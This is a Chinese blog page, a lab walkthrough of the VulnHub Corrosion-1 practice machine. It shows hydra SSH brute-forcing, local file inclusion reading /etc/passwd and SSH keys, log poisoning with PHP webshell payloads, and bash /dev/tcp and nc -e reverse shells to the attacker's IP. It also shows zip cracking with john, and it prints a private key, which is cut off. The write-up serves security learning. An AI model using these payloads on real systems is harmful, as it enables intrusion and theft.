@@ -1,0 +1,1159 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/head.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Achernar">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Corrosion-1靶机IP：192.168.11.137 信息收集： 扫端口：namp -A -p- -sV 192.168.11.137（或者使用fscan去扫描，这里偷懒一下，具体建议都扫详细点）      开放了22，80端口分别运行ssh，http服务         爆破ssh：  依旧看到ssh，还是得爆破一波，万一出来了呢，这边由于能偷看到主机名为randy，直接拿randy去爆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="励志学习第一天之vulnhub-Corrosion-1">
+<meta property="og:url" content="http://example.com/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/index.html">
+<meta property="og:site_name" content="Achernar">
+<meta property="og:description" content="Corrosion-1靶机IP：192.168.11.137 信息收集： 扫端口：namp -A -p- -sV 192.168.11.137（或者使用fscan去扫描，这里偷懒一下，具体建议都扫详细点）      开放了22，80端口分别运行ssh，http服务         爆破ssh：  依旧看到ssh，还是得爆破一波，万一出来了呢，这边由于能偷看到主机名为randy，直接拿randy去爆">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/biaoti.jpg">
+<meta property="article:published_time" content="2025-05-26T06:24:46.000Z">
+<meta property="article:modified_time" content="2025-05-27T12:13:34.913Z">
+<meta property="article:author" content="Achernar">
+<meta property="article:tag" content="原创">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/biaoti.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>励志学习第一天之vulnhub-Corrosion-1 - Achernar</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Nlnb8Qk84Y149g92eAYi98fl-gzGzoHsz","app_key":"4Bb0mDjXB8MftPeL9yNfjBgO","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Achernar</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="励志学习第一天之vulnhub-Corrosion-1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-26 14:24" pubdate>
+          2025年5月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">励志学习第一天之vulnhub-Corrosion-1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Corrosion-1"><a href="#Corrosion-1" class="headerlink" title="Corrosion-1"></a>Corrosion-1</h1><p><strong>靶机IP：192.168.11.137</strong></p>
+<h2 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a><strong>信息收集：</strong></h2><ul>
+<li>扫端口：namp -A -p- -sV 192.168.11.137（或者使用fscan去扫描，这里偷懒一下，具体建议都扫详细点）</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/1.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<p><strong>开放了22，80端口分别运行ssh，http服务</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>爆破ssh</strong>：</p>
+<ul>
+<li><p>依旧看到ssh，还是得爆破一波，万一出来了呢，这边由于能偷看到主机名为randy，直接拿randy去爆破</p>
+</li>
+<li><p>hydra -l randy -P &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;wordlist.txt ssh:&#x2F;&#x2F;192.168.11.137</p>
+<p>（小字典就行了吧，能出的弱密码都行，大字典太消耗时间了，时间就是金钱，最后还是没有结果）</p>
+</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<p><strong>访问80端口，从web页面入手：</strong></p>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/2.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li>居然啥都没有搭建，就只开了个apache的默认界面，那这个肯定没啥用了</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<p><strong>扫目录：</strong></p>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/3.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li>依次去看是啥东西</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<ul>
+<li>在tasks目录下发现任务清单：（有日志和修改端口还有搭建phpMyAdmin）</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/17.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+<ul>
+<li>&#x2F;blog-post&#x2F;uploads&#x2F;目录下是一个博客</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/4.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<ul>
+<li>&#x2F;blog-post&#x2F;archives&#x2F;randylogs.php</li>
+<li>（目录下发现个randylogs.php，但是是个空白页？？？，估计里面有东西，先放着）</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/5.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<p><strong>回去看了看&#x2F;blog-post&#x2F;uploads&#x2F;，总以为能在其中找到上传的地方，结果找半天居然是个重定向的东西，</strong></p>
+<p><strong>重定向到了&#x2F;blog-post&#x2F;，两个同个页面，那只好从其它地方入手了</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<ul>
+<li>回到刚刚的空白页，一般遇到空白页我们还是需要去FUZZ一波的，因为是个php那估计有传参搞一波</li>
+</ul>
+<p><strong>直接使用brup去跑就行了，当然也可以使用别的工具，例如wfuzz、yakit等都行</strong></p>
+<ul>
+<li>wfuzz -w （字典） -u “<a target="_blank" rel="noopener" href="http://192.168.11.137/blog-post/archives/randylogs.php?FUZZ=/etc/passwd">http://192.168.11.137/blog-post/archives/randylogs.php?FUZZ=/etc/passwd</a>“   –hw 0</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/6.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+
+
+<p>通过文件包含漏洞来读取文件和包含文件。使用php伪协议来读取randylogs.php</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">&lt;?php<br><span class="hljs-meta prompt_">$</span><span class="language-bash">file = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];</span><br><span class="hljs-meta prompt_">if(isset($</span><span class="language-bash">file))</span><br>&#123;<br>    include(&quot;$file&quot;);<br>&#125;<br>else<br>&#123;<br>    include(&quot;index.php&quot;);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">解密没有发现其他的信息，</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">只是使用include方法包含GET提交的file参数的文件。尝试读取randy的公钥、私钥，apache的日志文件都没有成功。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">读取公钥：file=php://filter/read=convert.base64-encode/resource=/home/randy/.ssh/id_rsa.pub</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">apache日志文件：file=php://filter/read=convert.base64-encode/resource=/var/log/apache2/access.log</span><br></code></pre></td></tr></table></figure>
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<p><strong>那这就不用想了就这个参数 file 构成LFI 漏洞</strong></p>
+<ul>
+<li>但是现在不知道有什么文件可以用啊</li>
+<li>想起前面的任务清单没有，日志，那估计有存在的日志可以使用，我们去跑一下</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/7.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<p><strong>扫出来挺多的，翻到这个好像是个日志我们去看看是什么日志</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/8.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<p><strong>咋一看好像是我们刚刚ssh爆破的命令都在里面了，随便搜一下是什么日志文件</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/var/log/auth.log<br><span class="hljs-meta prompt_">#</span><span class="language-bash">这是一个文本文件，记录了所有和用户认证相关的日志，无论是ssh登录，还是<span class="hljs-built_in">sudo</span>执行命令都会在里面记录</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>那么就存在【写入日志】漏洞了</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+
+
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p><strong>SSH登录，写入WebShell</strong></p>
+<ul>
+<li><p>下面四条命令经尝试，都失败了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh &#x27;&lt;?php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27;@192.168.11.137<br>ssh &#x27;&lt;?php @eval($_REQUEST[&quot;x&quot;]); ?&gt;&#x27;@192.168.11.137<br>ssh &#x27;&lt;?php system($_REQUEST[&quot;x&quot;]); ?&gt;&#x27;@192.168.11.137<br>ssh &#x27;&lt;?php system($_REQUEST[&#x27;x&#x27;]); ?&gt;&#x27;@192.168.11.137<br></code></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+</li>
+<li><p>（因为ssh的命名有限制）那就使用别名的方法去绕过这个吧</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在root目录下的.ssh文件里面创建文本文档config</span><br>touch config<br><span class="hljs-meta prompt_"># </span><span class="language-bash">确保文件权限正确</span><br>chmod 600 ~/.ssh/config<br><span class="hljs-meta prompt_">#</span><span class="language-bash">写入别名使用</span><br>Host myserver          			# 自定义别名<br>    HostName 192.168.1.100  	# 服务器IP或域名<br>    User admin             	 	# 登录用户名<br>    Port 2222               	# SSH端口（默认22可省略）<br>    IdentityFile ~/.ssh/id_rsa  # 密钥路径（可选）<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/9.jpg" srcset="/img/loading.gif" lazyload class="image.jpg"></li>
+</ul>
+<p><strong>端口22默认没写，并且没有密钥</strong></p>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<p><strong>直接ssh：</strong></p>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/10.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li>包含日志看看是否存在</li>
+</ul>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/11.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<ul>
+<li>成功写入，直接开启监听反弹shell</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1<br>nc -e /bin/bash 192.168.11.128 9999<br><span class="hljs-meta prompt_">#</span><span class="language-bash">他奶奶的都反弹不成功，出题人干鸡毛（不是人）</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">反弹成功</span><br>bash -c &#x27;bash -i &gt;&amp;/dev/tcp/192.168.11.128/9999 0&gt;&amp;1&#x27; （bash -c 会把字符串当作命令执行）<br>在这里不能直接这样传，因为在url上可能会有问题例如会把&amp;当做连接符，所以我们编码后传<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">另一条语句：</span><br>echo &quot;bash -i &gt;&amp; /dev/tcp/172.18.171.250/4444 0&gt;&amp;1&quot; | bash（同样可以反弹）<br></code></pre></td></tr></table></figure>
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+<h2 id="后渗透："><a href="#后渗透：" class="headerlink" title="后渗透："></a>后渗透：</h2><img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/12.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>常规信息收集</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">history<br><br>sudo -l<br><br>crontab -l<br><br>cat /etc/crontab<br><br>find / -perm /4000 -user root -printf 2&gt;/dev/null <br><br>echo $PATH<br></code></pre></td></tr></table></figure>
+
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/13.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<p><strong>最终在&#x2F;var&#x2F;backups找到用户名的备份文件，那肯定得解压出来看看啊</strong></p>
+<p><strong>你奶奶的居然要密码，那就传到kali去爆破解压</strong></p>
+<img src="/2025/05/26/%E5%8A%B1%E5%BF%97%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E4%B9%8Bvulnhub-Corrosion-1/14.jpg" srcset="/img/loading.gif" lazyload class="image.jpg">
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">生成 hash.txt</span><br>zip2john user_backup.zip &gt; hash.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">然后使用 john 进行破解，同时指定一个强一点的字典(kali自带)</span><br>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+
+
+
+
+
+
+<p><strong>解压之后，里面内容：</strong></p>
+<ul>
+<li>c文件</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123; setuid(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置 userid 为0 即为最高权限(root)</span><br>  setgid(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置 groupid 为0 即为最高权限(root)</span><br>  system(<span class="hljs-string">&quot;/usr/bin/date&quot;</span>); <span class="hljs-comment">// 执行命令</span><br><br>  system(<span class="hljs-string">&quot;cat /etc/hosts&quot;</span>); <span class="hljs-comment">// 执行命令</span><br><br>  system(<span class="hljs-string">&quot;/usr/bin/uname -a&quot;</span>); <span class="hljs-comment">// 执行命令</span><br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><em>id_rsa</em> （私钥）</li>
+</ul>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nix">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA4INQLmsx2RU1XC<span class="hljs-operator">+</span>Wl491khfGhOtGgDxJtEpioKQY1K8gY7gYEcYw<br>Sv9lksbGQK2d9kepGRug0PisW0hZtmTXRwdgvO1uRcJzDt58iHE0iyur2EB0h50ZnD1KhD<br>DRMoXMopVtXI96ZdT0EYGNSROVP<span class="hljs-operator">+</span>RRdykBFZUQnNWCDKG4YV7b7odu3cDfPhZ9PyqFm6<span class="hljs-symbol">/2</span><br>lCQdORepNU5dkh<span class="hljs-symbol">/VIh2UwB0d5KSYzIH+NDQ8ILoWOzb5XiWyLq5BqKPIun2/gk3ZLu3Ywx</span><br>YLEnG6u8LbRCYdib8TDf<span class="hljs-operator">+</span>C66wtq4hbSKbb7HG4pKO<span class="hljs-operator">+</span>S6sfPvFjKKR2D4VbqKKgSFYqDv4P<br>K8ID58gHrGkV<span class="hljs-symbol">/PfX4lD/nag0j2S1o0llMR0/gmS8ciZqvWHT1jVGHVexrG0p25t/EwnLIb</span><br>UNrFJYPU9QPq0E6IUx6S75E6c9ctwUWTg<span class="hljs-symbol">/ZJqjXbsOiH43N0jr26pL+lb3VkJL3R9GapLT</span><br>fOFoZBXhcumY0Gij9OyJ5Lj16seewqaQEWXJfRxlAAAFgABg47MAYOOzAAAAB3NzaC1yc2<br>EAAAGBAOCDUC5rMdkVNVwvlpePdZIXxoTrRoA8SbRKYqCkGNSvIGO4GBHGMEr<span class="hljs-symbol">/ZZLGxkCt</span><br>nfZHqRkboND4rFtIWbZk10cHYLztbkXCcw7efIhxNIsrq9hAdIedGZw9SoQw0TKFzKKVbV<br>yPemXU9BGBjUkTlT<span class="hljs-symbol">/kUXcpARWVEJzVggyhuGFe2+6Hbt3A3z4WfT8qhZuv9pQkHTkXqTVO</span><br>XZIf1SIdlMAdHeSkmMyB<span class="hljs-symbol">/jQ0PCC6Fjs2+V4lsi6uQaijyLp9v4JN2S7t2MMWCxJxurvC20</span><br>QmHYm<span class="hljs-symbol">/Ew3/guusLauIW0im2+xxuKSjvkurHz7xYyikdg+FW6iioEhWKg7+DyvCA+fIB6xp</span><br>Ffz31<span class="hljs-operator">+</span>JQ<span class="hljs-symbol">/52oNI9ktaNJZTEdP4JkvHImar1h09Y1Rh1XsaxtKdubfxMJyyG1DaxSWD1PUD</span><br><span class="hljs-number">6</span>tBOiFMeku<span class="hljs-operator">+</span>ROnPXLcFFk4P2Sao127Doh<span class="hljs-operator">+</span>NzdI69uqS<span class="hljs-symbol">/pW91ZCS90fRmqS03zhaGQV4XLp</span><br>mNBoo<span class="hljs-symbol">/TsieS49erHnsKmkBFlyX0cZQAAAAMBAAEAAAGBAJY4BkwouR+wyxU1WiNqf5YShm</span><br>elLHTc4cvaAYfOhDa6Poe6Q5CQ9PsZS5MboMbh49FHPWNpUv6<span class="hljs-symbol">/hENHc49QhaIm05lVm/Td</span><br>GDMYtmZsqGV<span class="hljs-operator">+</span>AOsepVmfyeT6NYOhTjfpwnP<span class="hljs-operator">+</span>W0AVWCYOiIe2ERyWF8S6Na<span class="hljs-symbol">/vJaSVKpplWT</span><br>CufDnaSHme8JU7WaOnVIIRJ3h2Ehwo1cy<span 